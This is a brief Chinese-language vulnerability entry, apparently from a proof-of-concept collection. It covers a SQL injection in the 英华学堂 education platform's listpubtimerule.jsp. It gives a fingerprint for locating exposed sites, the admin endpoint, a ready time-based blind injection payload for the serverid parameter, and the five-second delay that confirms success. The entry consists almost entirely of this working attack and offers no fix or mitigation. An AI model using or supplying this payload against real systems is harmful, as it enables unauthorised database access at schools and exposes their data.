# 英华学堂listpubtimerule.jsp存在SQL注入漏洞（EDU）

英华学堂 ｜ SQL注入 ｜ —
- **指纹**：`body="英华在线"`
- **请求**：`POST /cms/cmsadmin/pub/listpubtimerule.jsp HTTP/1.1`

**Payload**
```
serverid=' AND (SELECT 8490 FROM (SELECT(SLEEP(5)))iIeJ) AND 'VXvO'='VXvO
```
- **响应特征**：200 响应时间>=5s